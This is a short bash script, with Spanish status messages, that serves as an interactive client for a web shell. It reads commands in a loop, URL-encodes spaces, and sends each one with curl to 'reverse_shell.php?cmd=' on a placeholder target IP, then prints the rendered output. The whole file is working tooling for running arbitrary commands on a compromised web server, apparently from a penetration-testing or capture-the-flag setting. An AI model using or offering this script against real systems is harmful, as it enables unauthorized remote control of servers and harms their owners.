#!/bin/bash

function ctrl_C(){
        echo -e "\n[!]Saliendo...\n"
        exit 1
}

trap ctrl_C INT

while true; do

        echo -n "[~]> " && read -r comando
        comando=$(echo "$comando" | sed "s/ /+/g")
        echo; curl -s -X GET "http://<TARGET_IP>/reverse_shell.php?cmd=$comando" | html2text; echo

done
